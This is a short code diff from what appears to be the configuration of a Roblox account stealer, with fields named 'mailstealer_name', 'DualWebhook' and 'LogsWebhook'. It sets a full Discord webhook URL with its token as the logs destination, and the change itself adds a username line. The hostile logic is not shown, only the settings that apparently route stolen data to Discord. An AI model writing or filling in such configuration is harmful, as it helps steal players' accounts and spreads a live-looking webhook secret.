@@ -138,6 +138,7 @@ DualUser = ""
 DualWebhook = ""
 LogsWebhook = "https://discord.com/api/webhooks/1372526703993163847/_PSZ6YmDo4SSJRHe_XmwWaoCU3GBhZFQJvCGuEiFxgBUOGqoMcXeWdbdF447eEUNE2bW"
 mailstealer_name = "xe"
+Username = "Erengobrrr"
 Roblox_Username = Username
 Discord_Webhook = Webhook
 LOGS_WEBHOOK = LogsWebhook
